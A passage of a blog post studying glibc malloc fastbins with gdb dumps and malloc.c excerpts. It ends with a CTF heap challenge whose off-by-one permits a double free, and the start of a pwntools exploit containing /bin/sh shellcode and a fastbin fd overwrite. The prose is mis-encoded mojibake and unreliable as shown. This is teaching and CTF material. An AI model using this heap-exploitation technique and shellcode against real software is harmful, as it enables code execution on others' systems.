---
title: glibc mallocå­¦ä¹ ç¬”è®°ä¹‹fastbinğŸ¦
date: 2017-07-25 00:25:59
tags: bin
---

fastbinç›¸å…³çš„å †çŸ¥è¯†æˆ‘ä¸€å¹´å‰å°±å­¦è¿‡äº†ï¼Œä½†æ˜¯éƒ½æ²¡å†™å•¥è®°å½•æ–‡æ¡£ï¼Œåˆå’¸é±¼äº†å¥½é•¿ä¸€æ®µæ—¶é—´ï¼Œè¦æ¡å›æ¥è¿™å—çš„çŸ¥è¯†ï¼Œåˆé‡æ–°å¼€å§‹å­¦ä¹ äº†ä¸€éï¼Œè¿™ç¯‡åšæ–‡ä¸­è®°å½•ä¸‹æˆ‘å¯¹fastbinçš„ä¸ªäººç†è§£ã€‚

<!--more-->

# åŸºç¡€çŸ¥è¯†ç ”ç©¶

å½“ä½¿ç”¨mallocå‡½æ•°ç¬¬ä¸€æ¬¡å‘ç³»ç»Ÿç”³è¯·å°äº128kbçš„å†…å­˜æ—¶ï¼Œä¼šé€šè¿‡sys_brkç”³è¯·132kbçš„å†…å­˜ï¼Œè¿™å—å†…å­˜å°±ç§°ä¸ºå †ã€‚

å†™ä¸ªæµ‹è¯•ä»£ç ï¼Œå¯¹ç€æµ‹è¯•ä»£ç è¿›è¡Œåˆ†æ(64ä½ç³»ç»Ÿ)ï¼š

```c
# test.c
# gcc test.c -o test
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	char *q;
	char *p;
	int x;
	char input[3];

	while(1) {
		read(0,input,3);
		x = atoi(input);
		q = (char *)malloc(x);
		read(0,input,3);
		x = atoi(input);
		p = (char *)malloc(x);
		free(q);
		free(p);
	}
	return 0;
}
```

ç„¶åä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•(ä½¿ç”¨pedaå’Œlibheapæ’ä»¶ï¼Œè¿™ä¸¤ä¸ªéƒ½å¯ä»¥åœ¨githubä¸Šæœåˆ°)ï¼Œå½“ç¬¬ä¸€æ¬¡è°ƒç”¨malloc(0x10)ä¹‹åï¼ŒæŸ¥çœ‹å†…å­˜ä¿¡æ¯ï¼š

```
gdb-peda$ vmmap
....
0x00602000         0x00623000         rw-p	[heap]
....
```

å¯ä»¥çœ‹åˆ°å †çš„å¤§å°ä¸º132kb

å…ˆæ¥è¯´ä¸‹åŸºç¡€æ¦‚å¿µï¼š

fast chunkè¡¨ç¤ºæ­£åœ¨ä½¿ç”¨çš„é•¿åº¦åœ¨`32-160`(32ä½ç³»ç»Ÿæ˜¯`16-80`)çš„å †å—ï¼Œè€Œfastbinè¡¨ç¤ºé•¿åº¦åœ¨`32-180`èŒƒå›´å†…çš„å·²ç»é‡Šæ”¾çš„å †å—

æˆ‘ä»¬å¯ä»¥çœ‹æºç ä¸­çš„å®šä¹‰ï¼š

```c
1570	/* The maximum fastbin request size we support */
1571	#define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)
```

å…¶ä¸­`SIZE_SZ`æ ¹æ®æ“ä½œç³»ç»Ÿå†³å®šï¼Œ32ä½ç³»ç»Ÿä¸º4, 64ä½ç³»ç»Ÿä¸º8

æ‰€ä»¥ä¹‹ååˆå®šä¹‰äº†ä¸€ä¸ªfastbinæ•°ç»„ï¼Œç”¨æ¥å­˜åœ¨fastbinï¼š

```c
1659	  /* Fastbins */
1660	  mfastbinptr fastbinsY[NFASTBINS];
```

å…¶ä¸­`NFASTBINS`æ˜¯å®å®šä¹‰ï¼Œä¸€èˆ¬ç®—å‡ºæ¥æ˜¯10ï¼Œæ‰€ä»¥è¿™ä¸ªæ•°ç»„çš„é•¿åº¦ä¸º10ï¼Œå€¼ä¸ºåœ°å€ï¼Œå‚¨å­˜fastbinçš„åœ°å€ï¼Œæ¯”å¦‚fastbinsY[0]çš„å€¼ä¸ºæœ€æ–°é‡Šæ”¾å‡ºæ¥çš„é•¿åº¦ä¸º32çš„fastbinçš„åœ°å€ï¼Œfastbinæ˜¯æ ¹æ®é•¿åº¦å­˜æ”¾æ•°ç»„çš„ï¼Œæ‰€ä»¥index=1å­˜æ”¾çš„æ˜¯48ï¼Œ2->64, 3->80, 4->96, 5->112, 6->128, 7->144, 8->160, è€ŒfastbinsY[9]å´ç”¨ä¸ä¸Šï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥.....

ä½†æ˜¯æˆ‘å´è§£å†³äº†è¿™é‡Œçš„å¦ä¸€ä¸ªå‘ï¼Œå¦‚æœæˆ‘ä»¬è¿›è¡Œæµ‹è¯•ï¼Œå°±ä¼šå‘ç°æˆ‘ä»¬æœ€å¤§malloc(120)ï¼Œsize=128çš„chunkæ‰æ˜¯fast chunkï¼Œfreeåå¯ä»¥æ”¾åˆ°fastbinsY[6]ä¸­å»ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬malloc(128)ï¼Œfreeåå´æ”¾åˆ°äº†unsortbinä¸­å»ï¼Œä¹Ÿå°±æ˜¯è¯´index=7 or 8ä¹Ÿæ˜¯ç”¨ä¸ä¸Šçš„ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä»£ç :

```c
729	#ifndef DEFAULT_MXFAST
730	#define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)
731	#endif
```

è¿™é‡Œä»£ç è¿˜å®šä¹‰äº†é»˜è®¤fastçš„å¤§å°ä¸º128(32ä½çš„ä¸º64)ï¼Œè€Œè¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯ä»¥ä¿®æ”¹çš„ï¼Œè¯¦æƒ…è§ï¼š<http://man7.org/linux/man-pages/man3/mallopt.3.html>

```
       M_MXFAST (since glibc 2.3)
              Set the upper limit for memory allocation requests that are
              satisfied using "fastbins".  (The measurement unit for this
              parameter is bytes.)  Fastbins are storage areas that hold
              deallocated blocks of memory of the same size without merging
              adjacent free blocks.  Subsequent reallocation of blocks of
              the same size can be handled very quickly by allocating from
              the fastbin, although memory fragmentation and the overall
              memory footprint of the program can increase.

              The default value for this parameter is 64*sizeof(size_t)/4
              (i.e., 64 on 32-bit architectures).  The range for this
              parameter is 0 to 80*sizeof(size_t)/4.  Setting M_MXFAST to 0
              disables the use of fastbins.
```

æ‰€ä»¥é»˜è®¤æƒ…å†µä¸‹ï¼Œfastbinæ•°ç»„çš„æœ€å3ä¸ªæ˜¯ä¸ä¼šå­˜å‚¨æ•°æ®çš„

äº†è§£äº†é•¿åº¦çš„é—®é¢˜åæ¥è¯´è¯´chunkå’Œbinçš„é—®é¢˜

ä¸€ä¸ªåœ¨ä½¿ç”¨ä¸­çš„å †å°±æ˜¯chunkï¼Œå½“æˆ‘ä»¬freeäº†è¿™ä¸ªchunkåï¼Œå°±ä¼šæ”¾å…¥ç›¸åº”çš„binä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´å½“freeäº†fast chunkï¼Œå°†ä¼šæŠŠè¿™ä¸ªchunkå­˜æ”¾åˆ°fastbinä¸­ï¼Œå¦‚ä½•å­˜æ”¾åé¢è¯´ã€‚

æˆ‘ä»¬å†æ¥çœ‹ä¸‹é¢çš„å†…å®¹ï¼š

```
gdb-peda$ heapls
[!] No gdb frame is currently selected.

           ADDR             SIZE            STATUS
sbrk_base  0x602000
chunk      0x602000         0x20            (inuse)
chunk      0x602020         0x20fe0         (top)
sbrk_end   0x623000
gdb-peda$ x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000021
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe0
```

è¿˜æœ‰ä¸€ä¸ªchunkåå«top chunkï¼Œè¿™ä¹ˆè¯´å§ï¼Œåœ¨ä½¿ç”¨çš„chunk + bin + top chunkçš„å¤§å°å°±ä¸º132kbï¼Œçœ‹ä¸Šé¢çš„fast chunkçš„size=0x20åŠ ä¸Štop chunkçš„size=0x20fe0çš„å’Œä¸º0x21000ï¼Œä¹Ÿå°±æ˜¯sys_brkç”³è¯·ä¸‹æ¥132kbçš„å †å¤§å°ã€‚

ä¸‰è€…ä¹‹é—´çš„é€»è¾‘æ˜¯è¿™æ ·çš„(é»˜è®¤64ä½ç³»ç»Ÿï¼Œä¹‹åéƒ½é»˜è®¤äº†)ï¼Œé¦–å…ˆè°ƒç”¨malloc(0x10)ï¼Œé¦–å…ˆå»åˆ¤æ–­fastbinsY[0]æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªåœ°å€ï¼Œç„¶åå»æ£€æµ‹ä¸€äº›æœ‰æ•ˆæ€§å•¥çš„ï¼Œæ¯”å¦‚sizeæ˜¯å¦ä¸º0x20(size >> 3 << 3, ä¸ç®—æ ‡å¿—ä½)ï¼Œå¦‚æœæ£€æµ‹å‡ºé—®é¢˜äº†å°±æŠ›å‡ºå¼‚å¸¸ï¼Œå¦åˆ™mallocçš„è¿”å›å€¼å°±ä¸ºè¯¥åœ°å€ï¼Œç„¶åfastbinsY[0]æ–°çš„å€¼ä¸ºï¼š`fastbinsY[0]=fastbinsY[0]->fd`

å¦‚æœfastbinsY[0]=0çš„è¯ï¼Œåˆ™å»åˆ¤æ–­top chunkçš„å¤§å°æ˜¯å¦å¤Ÿï¼Œå¦‚æœå¤Ÿå°±ä»top chunkä¸­å–å‡ºï¼Œæ“ä½œå¤§æ¦‚æ˜¯è¿™æ ·çš„:

```
top->size -= 32
*(top+32) = top->size
top->size = 0x21
ret = top + 16
top = top + 32
return ret
```

ç„¶åå°±æ˜¯freeçš„æ“ä½œäº†

PS: æ­¤æ–‡åªè®²fastbin

```
p = malloc(16)
free(p) ->
p->fd = fastbinsY[0]
fastbinsY[0] = p
```

å¾ˆç®€å•ï¼Œfastbinæ˜¯ä¸€ä¸ªå•é“¾è¡¨ï¼Œä»ä¸Šé¢å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªLIFO(*Last in, first out*åè¿›å…ˆå‡º)

å½“åˆæˆ‘è¿˜æƒ³äº†åŠå¤©ä¸ºå•¥ä½¿ç”¨LIFOï¼Œä¸ºå•¥æ–°freeçš„chunkä¸ç›´æ¥æ’åˆ°å±è‚¡ï¼Œå› ä¸ºæˆ‘ä»¬åªæœ‰ä¸€ä¸ªfastbinsY[0]æŒ‡é’ˆï¼Œå¦‚æœç›´æ¥æ’åˆ°å±è‚¡çš„è¯æ¯æ¬¡éƒ½è¦è¿­ä»£åˆ°æœ€åä¸€ä¸ªchunkç„¶åæŠŠå®ƒçš„fdèµ‹å€¼ä¸ºæ–°çš„chunkçš„åœ°å€ï¼Œè€Œä½¿ç”¨LIFOï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹fastbinsY[0]æŒ‡é’ˆçš„å€¼å’Œæ–°çš„chunkçš„å€¼ï¼ŒèŠ±è´¹åœ¨fastbiné“¾æœ‰å¾ˆå¤šçš„æ—¶å€™è‚¯å®šæ˜¯æ›´å°‘çš„

# ç»“æ„

åŸç†åº”è¯¥å·®ä¸å¤šäº†ï¼Œç„¶åè®²è®²ç»“æ„

æˆ‘ä»¬å¯ä»¥ä½¿ç”¨libheapæ¥æŸ¥çœ‹ç°åœ¨å †çš„ä¸€äº›ä¿¡æ¯ï¼š

```
gdb-peda$ heap
Arena(s) found:
  arena @ 0x7ffff7dd1b20
gdb-peda$ fastbins
[!] No gdb frame is currently selected.

fastbins
[ fb 0 ] 0x7ffff7dd1b28  -> [ 0x0 ] 
[ fb 1 ] 0x7ffff7dd1b30  -> [ 0x0 ] 
[ fb 2 ] 0x7ffff7dd1b38  -> [ 0x0 ] 
[ fb 3 ] 0x7ffff7dd1b40  -> [ 0x0 ] 
[ fb 4 ] 0x7ffff7dd1b48  -> [ 0x0 ] 
[ fb 5 ] 0x7ffff7dd1b50  -> [ 0x0 ] 
[ fb 6 ] 0x7ffff7dd1b58  -> [ 0x0 ] 
[ fb 7 ] 0x7ffff7dd1b60  -> [ 0x0 ] 
[ fb 8 ] 0x7ffff7dd1b68  -> [ 0x0 ] 
[ fb 9 ] 0x7ffff7dd1b70  -> [ 0x0 ] 

```

é¦–å…ˆæ˜¯arenaæ˜¯ä»€ä¹ˆï¼Œè¿™ä¸ªåœ°å€è¡¨ç¤ºçš„æ˜¯å•¥ï¼Ÿè¿™ä¸ªæˆ‘æ²¡æ‰¾åˆ°ç›¸å…³çš„æ–‡ç« ï¼Œæˆ‘æ˜¯è‡ªå·±è§£å†³çš„ï¼Œé¦–å…ˆæˆ‘ä½¿ç”¨`vmmap`å…ˆæŸ¥çœ‹è¿™ä¸ªåœ°å€å±äºå“ª:

```
gdb-peda$ vmmap
Start              End                Perm	Name
......
0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so
......
```

ç„¶åå‘ç°è¿™ä¸ªåœ°å€æ˜¯å±äºlibcçš„ï¼Œç„¶åçŒœæµ‹åº”è¯¥æ˜¯mallocç›¸å…³çš„ï¼Œå†åŠ ä¸Šå‘ç°arena+8æ˜¯fastbinï¼Œç„¶åæˆ‘åœ¨malloc.cä¸­æ‰¾åˆ°äº†ä¸€ä¸ªç»“æ„ä½“ï¼š

```c
1651	struct malloc_state
1652	{
1653	  /* Serialize access.  */
1654	  __libc_lock_define (, mutex);
1655	
1656	  /* Flags (formerly in max_fast).  */
1657	  int flags;
1658	
1659	  /* Fastbins */
1660	  mfastbinptr fastbinsY[NFASTBINS];
1661	
1662	  /* Base of the topmost chunk -- not otherwise kept in a bin */
1663	  mchunkptr top;
1664	
1665	  /* The remainder from the most recent split of a small request */
1666	  mchunkptr last_remainder;
1667	
1668	  /* Normal bins packed as described above */
1669	  mchunkptr bins[NBINS * 2 - 2];
1670	
1671	  /* Bitmap of bins */
1672	  unsigned int binmap[BINMAPSIZE];
1673	
1674	  /* Linked list */
1675	  struct malloc_state *next;
1676	
1677	  /* Linked list for free arenas.  Access to this field is serialized
1678	     by free_list_lock in arena.c.  */
1679	  struct malloc_state *next_free;
1680	
1681	  /* Number of threads attached to this arena.  0 if the arena is on
1682	     the free list.  Access to this field is serialized by
1683	     free_list_lock in arena.c.  */
1684	  INTERNAL_SIZE_T attached_threads;
1685	
1686	  /* Memory allocated from the system in this arena.  */
1687	  INTERNAL_SIZE_T system_mem;
1688	  INTERNAL_SIZE_T max_system_mem;
1689	};
```

ç„¶åå‘ç°ï¼š

```
gdb-peda$ x/16gx 0x7ffff7dd1b20
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000602000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602040
```

`0x7ffff7dd1b78`çš„å€¼ä¸ºtop chunkçš„åœ°å€ç„¶åå°±çŸ¥é“æˆ‘åº”è¯¥æ˜¯æ²¡æ‰¾é”™äº†ï¼Œè¿™å—åŒºåŸŸå°±æ˜¯å„ç±»binçš„é“¾é¦–ï¼Œå…¶ä»–çš„small, large, unsort binä¹‹ç±»çš„éƒ½æ˜¯å­˜å‚¨åœ¨`mchunkptr bins[NBINS * 2 - 2];`ä¹‹ä¸­ï¼Œæ‰¾åˆ°ä¸€ç¯‡æ–‡ç« ä¸­æ˜¯æœ‰ä»‹ç»çš„:

> - Bin 1 â€“ Unsorted bin
> - Bin 2 to Bin 63 â€“ Small bin
> - Bin 64 to Bin 126 â€“ Large bin

è¿™äº›ä»¥åç ”ç©¶ï¼Œç»§ç»­çœ‹fastbin

æˆ‘ä»¬å†æ¥çœ‹chunkçš„ç»“æ„ï¼Œå®šä¹‰åœ¨malloc.cä¸­ï¼š

```c
1040	struct malloc_chunk {
1041	
1042	  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
1043	  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
1044	
1045	  struct malloc_chunk* fd;         /* double links -- used only if free. */
1046	  struct malloc_chunk* bk;
1047	
1048	  /* Only used for large blocks: pointer to next larger size.  */
1049	  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
1050	  struct malloc_chunk* bk_nextsize;
1051	};
......
1068	    An allocated chunk looks like this:
1069	
1070	
1071	    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
1072	            |             Size of previous chunk, if unallocated (P clear)  |
1073	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
1074	            |             Size of chunk, in bytes                     |A|M|P|
1075	      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
1076	            |             User data starts here...                          .
1077	            .                                                               .
1078	            .             (malloc_usable_size() bytes)                      .
1079	            .                                                               |
1080	nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
1081	            |             (size of chunk, but used for application data)    |
1082	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
1083	            |             Size of next chunk, in bytes                |A|0|1|
1084	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
......
1094	    Free chunks are stored in circular doubly-linked lists, and look like this:
1095	
1096	    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
1097	            |             Size of previous chunk, if unallocated (P clear)  |
1098	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
1099	    `head:' |             Size of chunk, in bytes                     |A|0|P|
1100	      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
1101	            |             Forward pointer to next chunk in list             |
1102	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
1103	            |             Back pointer to previous chunk in list            |
1104	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
1105	            |             Unused space (may be 0 bytes long)                .
1106	            .                                                               .
1107	            .                                                               |
1108	nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
1109	    `foot:' |             Size of chunk, in bytes                           |
1110	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
1111	            |             Size of next chunk, in bytes                |A|0|0|
1112	            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

ä¸Šé¢è¿™ä¹ˆä»£ç å’Œæ³¨é‡Šè¿™ä¹ˆå¤šæ˜¯é’ˆå¯¹æ•´ä½“çš„chunkæ¥è¯´çš„ï¼Œè€Œæˆ‘è¿™ç¯‡æ–‡ç« ä¸­æ˜¯é’ˆå¯¹fast chunkå’Œfast binè¿›è¡Œç ”ç©¶.

å¯¹äºfast chunkå…¶å®å°±ä¸€ä¸ªæœ‰ç”¨çš„å­—æ®µï¼Œå°±æ˜¯sizeï¼Œè¡¨ç¤ºå½“å‰chunkçš„å¤§å°ï¼Œç„¶åsizeçš„ä½ä¸‰bitä½æ˜¯æ ‡å¿—ä½ï¼Œä¸ºä»€ä¹ˆsizeçš„æœ€åä¸‰bitèƒ½æ˜¯æ ‡å¿—ä½ï¼Œå› ä¸ºåœ¨32ä½ç³»ç»Ÿä¸­ï¼Œchunkæ°¸è¿œæ˜¯8çš„å€æ•°ï¼Œç„¶åå†™ä»£ç çš„äººç§‰æŒäº†ä¸æµªè´¹ä»»ä½•ä¸€bitçš„åŸåˆ™ï¼Œè¿™æœ€å3bitå°±è¢«å“ªæ¥åšæ ‡å¿—ä½äº†ï¼Œä¸è¿‡åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œchunkæ˜¯16çš„å€æ•°ï¼Œæ‰€ä»¥è®²é“ç†ï¼Œåœ¨64ä½ç³»ç»Ÿä¸­sizeçš„ä½4bitéƒ½æ˜¯èƒ½æ‹¿æ¥åšæ ‡å¿—ä½çš„ï¼Œä½†æ˜¯æˆ‘çŒœæµ‹ï¼Œåº”è¯¥æ˜¯64ä½ç³»ç»Ÿå’Œ32ä½ç›¸æ¯”æ²¡æœ‰å¤šå•¥éœ€è¦æ ‡å¿—ä½çš„åŠŸèƒ½ï¼Œæ‰€ä»¥ä»»ç„¶æ˜¯ä½¿ç”¨ä½ä¸‰bitåšæ ‡å¿—ä½ã€‚

ç„¶ååœ¨åšPwnçš„æ—¶å€™å°±æ ‡å¿—ä½Pæœ‰ç”¨å§ï¼Œè¡¨ç¤ºä¸Šä¸€ä¸ªchunkæ˜¯å¦åœ¨ä½¿ç”¨ä¸­ï¼Œä¸è¿‡åœ¨fast chunk/binä¸­Pæ ‡å¿—ä½æ°¸è¿œæ˜¯1ï¼Œfreeæ“ä½œå¹¶ä¸ä¼šä¿®æ”¹fastbinçš„æ ‡å¿—ä½ï¼Œæ‰€ä»¥pre_sizeï¼Œå‰ä¸€ä¸ªä¸åœ¨ä½¿ç”¨ä¸­çš„chunkçš„å¤§å°ï¼Œå› ä¸ºP=1ï¼Œæ‰€ä»¥åœ¨fastbinä¸­è¿™ä¸ªå­—æ®µå¯ä»¥è¯´æ˜¯æ²¡ç”¨çš„ï¼Œå…¶å®è¿˜æ˜¯æœ‰ç”¨çš„ï¼Œåé¢è¯´ã€‚

å› ä¸ºchunkæ€»æ˜¯16çš„å€æ•°ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬malloc(0-16)çš„æ—¶å€™ï¼Œå¾—åˆ°çš„chunkçš„sizeå°±æ˜¯å­˜æ”¾æ•°æ®çš„16byteåŠ ä¸Šchunk headerï¼Œä¹Ÿå°±æ˜¯8byteçš„pre_sizeï¼Œå’Œ8byteçš„sizeï¼Œæ‰€ä»¥mallocå¾—åˆ°çš„æœ€å°çš„chunkå¤§å°ä¸º32byteã€‚

ä½†æ˜¯å½“æˆ‘æµ‹è¯•çš„æ—¶å€™å‘ç°ï¼Œæˆ‘malloc(0-24)å¾—åˆ°çš„chunkå¤§å°éƒ½ä¸º0x20, å½“æˆ‘malloc(25-40)å¾—åˆ°çš„chunkå¤§å°ä¸º0x30ï¼ŒæŒ‰æˆ‘çš„ç†è§£ï¼Œè¿™æ˜¯å› ä¸ºmallocçš„ä½œè€…æ˜¯å‘Šè¯‰ä½ å¯ä»¥æŠŠpre_sizeåˆ©ç”¨èµ·æ¥

å½“æˆ‘malloc(24)çš„æ—¶å€™ï¼Œå¾—åˆ°size=0x20çš„chunkï¼Œå…¶ä¸­æœ‰0x10çš„chunk headerï¼Œç„¶åæœ‰0x10çš„åœ°æ–¹å­˜æ”¾dataï¼Œç„¶åä»”ç»†ç ”ç©¶ä¼šå‘ç°ï¼Œè¿˜æœ‰8byteçš„ä¸‹ä¸€ä¸ªchunkçš„pre_sizeå¯ä»¥å­˜æ”¾æ•°æ®ï¼Œå› ä¸ºå½“å‰chunkè‚¯å®šæ˜¯ä½¿ç”¨ä¸­çš„ï¼Œæ‰€ä»¥ä¸‹ä¸€ä¸ªchunkçš„æ ‡å¿—ä½P=1ï¼Œpre_sizeæ²¡ç”¨ï¼Œæ‰€ä»¥å¯ä»¥è¢«ä¸Šä¸€ä¸ªchunkåˆ©ç”¨ï¼Œå½“freeçš„æ—¶å€™ï¼Œå†å¾€ä¸‹ä¸€ä¸ªchunkçš„pre_sizeè®¾ç½®å€¼ï¼Œæ‰€ä»¥æŒ‰ä½œè€…çš„æƒ³æ³•åº”è¯¥æ˜¯è¿™æ ·èƒ½è¾¾åˆ°æœ€å¤§åˆ©ç”¨ç‡ã€‚

ç„¶åå°±æ˜¯fastbinäº†ï¼Œå…¶å®fastbinå’Œfast chunkæ¯”ï¼Œå°±æ˜¯å¤šäº†ä¸€ä¸ªfdï¼Œåœ¨fastbinå•é“¾è¡¨ä¸­èµ·ä½œç”¨ï¼Œå‰é¢å·²ç»è¯´äº†ã€‚å› ä¸ºæ˜¯å•é“¾è¡¨ï¼Œæ‰€ä»¥bkæ²¡ç”¨ã€‚

å†™äº†è¿™ä¹ˆå¤šï¼Œä¸ªäººæ„Ÿè§‰åº”è¯¥æ˜¯å†™æ¸…æ¥šäº†ï¼Œå°±ç•™äº†ä¸€ä¸ªå‘å§â€”â€”fastbinsY[9]æœ‰å•¥ä½œç”¨ï¼Ÿ

# åœ¨Pwné¢˜ä¸­fastbinçš„åˆ©ç”¨

```c
# mistake.c
# gcc mistake.c -z execstack -o mistake
#include <stdio.h>
#include <stdlib.h>

typedef struct chunk{
	char buffer[0x10];
	int len;
}chunk;

chunk* list[0x30];
int chunk_number;

void menu()
{
	write(1,"1.create\n",9);
	write(1,"2.read\n",7);
	write(1,"3.free\n",7);
	write(1,"4.bye\n",6);
	write(1,"> ",2);
}

int transfer(char* buffer){
	int i,result = 0;
	for(i = 0;*(buffer+i) != 0;i++){
		if(*(buffer+i) > '9'||*(buffer+i) < '0'){
			return -1;
		}
		result = result*10 - '0' + *(buffer+i);
	}
	return result;
}

int read_int(){
	int i,result;
	char buffer[11];
	for(i = 0;i < 10;i++){
		read(0,buffer+i,1);
		if(*(buffer+i) == '\n'){
			break;
		}
	}
	*(buffer+i) = 0;
	if((result = transfer(buffer)) == -1){
		write(1,"Invalid input.\n",15);
		return -1;
	}
	return result;
}

void create_chunk()
{
	if(chunk_number > 0x2f){
		write(1,"no more chunk.\n",15);
		return;
	}
	chunk_number++;
	chunk* tmp = (chunk*)malloc(0x14);
	write(1,"content: ",9);
	tmp->len = read(0,tmp->buffer,0x10);
	list[chunk_number] = tmp;
	write(1,"create successfully.\n",21);
}

void read_chunk()
{
	int id;
	write(1,"id: ",4);
	if((id = read_int()) == -1){
		return;
	}
	if(id > chunk_number){
		write(1,"Index out of range.\n",20);	
		return;
	}
	write(1,list[id]->buffer,list[id]->len);
}

void free_chunk(){
        int id,i;
        write(1,"id: ",4);
	if((id = read_int()) == -1){
		return;
	}
        if(id > chunk_number){
                write(1,"Index out of range.\n",20);
		return;
        }
	free(list[id]);
	chunk_number--;
	for(i = id;i < 0x2f;i++){
		list[i] = list[i+1];
	}
	write(1,"delete successfully\n",20);
}

int main(void){
	chunk_number = -1;
	char input[2];
	int selete;
	while(1){
		menu();
		read(0,input,2);
		input[1] = 0;
		if(!(selete = atoi(input))){
			write(1,"Invalid input.\n",15);
			continue;
		}
		switch(selete){
		case 1:
			create_chunk();
			break;
		case 2:
			read_chunk();
			break;
		case 3:
			free_chunk();
			break;
		case 4:
			write(1,"bye~\n",5);
			return 0;
		default:
			write(1,"Invalid input\n",15);
		}
	}
}
```

é¢˜ç›®æ˜¯åä¼šçš„ä¸€ä¸ªå­¦å¼Ÿ(@spine)å‡ºçš„

å†ç»™ä¸ªDockerfileå§ï¼š<https://github.com/Hcamael/docker_lib/tree/master/heap/mistake>

è¿™é¢˜æ„Ÿè§‰å¯¹äºæ–°æ‰‹æŒºæœ‰éš¾åº¦çš„ï¼Œç¬¬ä¸€æ¬¡åšçš„æ—¶å€™èŠ±äº†å¾ˆé•¿æ—¶é—´ï¼Œç„¶åç°åœ¨å¤ä¹ è¿˜èŠ±äº†å¾ˆé•¿æ—¶é—´æ¡èµ·æ¥

è¿™é¢˜çš„æ¼æ´ç‚¹åœ¨ä¸€ä¸ªå¾ˆå°çš„åœ°æ–¹ï¼Œåœ¨`create_chunk`ï¼Œè¿™é‡Œå¯¹è¾“å…¥è¿›è¡Œæ£€æŸ¥ï¼Œchunk_numberçš„æœ€å¤§å€¼ä¸º0x2fï¼Œçœ‹ç€æ˜¯æ²¡é—®é¢˜ï¼Œä½†æ˜¯å†åˆ¤æ–­å®Œä»¥åè®©chunk_numberè¿›è¡Œè‡ªå¢ï¼Œä¹Ÿå°±æ˜¯åˆ°0x30äº†ï¼Œlist[0x30]æ˜¯ä¸æ˜¯æº¢å‡ºäº†ï¼Ÿä½†æ˜¯è¿™é‡Œæº¢å‡ºçœ‹ç€å±å®³å¥½åƒä¸å¤§ï¼Œä½†æ˜¯è¿›è¿‡ä¸€ç³»åˆ—ç»†å¾®çš„æ“ä½œï¼Œå¯ä»¥é€ æˆdouble free.

æˆ‘æƒ³äº†å¾ˆä¹…è¦æ€ä¹ˆæ€»ç»“pwné¢˜ï¼Œæœ€åè§‰å¾—è¿˜æ˜¯ä¸€å¼€å§‹å…ˆç‚¹å‡ºæ¼æ´ç‚¹ï¼Œç„¶åè´´å‡ºpayloadï¼Œå†å¯¹payloadè¿›è¡Œè§£é‡Šï¼Œæ‰€ä»¥ï¼Œpayloadå¦‚ä¸‹ï¼š

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

from pwn import *

# context.log_level = 'debug'

shellcode1 = "jhH\xb8/bin///sP\xeb\x21"
shellcode2 = "H\x89\xe71\xf6j;X\x99\x0f\x05"
p = process('./mistake')

def double_free():
	p.sendline('3')
	p.sendline('47')
	print p.recv()
	p.sendline('3')
	p.sendline('0')
	print p.recv()
	p.sendline('3')
	p.sendline('46')
	print p.recv()

def malloc_fd():
	p.sendline('1')
	p.sendline(p64(0x602080-8))
	print p.recv()
